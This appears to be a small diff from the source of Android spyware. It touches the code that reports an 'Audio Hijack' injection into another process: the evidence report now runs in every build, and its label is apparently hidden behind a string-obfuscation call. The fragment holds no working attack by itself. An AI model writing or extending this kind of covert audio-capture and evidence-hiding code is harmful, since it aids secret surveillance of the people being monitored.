@@ -154,9 +154,11 @@ public class Instrument {
 					// newpid = getProcessPid();
 					killed += 1;
 
-					if (started && Cfg.DEBUG) {
-						Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
-						EvidenceBuilder.info("Audio Hijack");
+					if (started) {
+						if(Cfg.DEBUG) {
+							Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
+						}
+						EvidenceBuilder.info(M.e("Audio injected"));
 					}
 
 					stopMonitor = false;
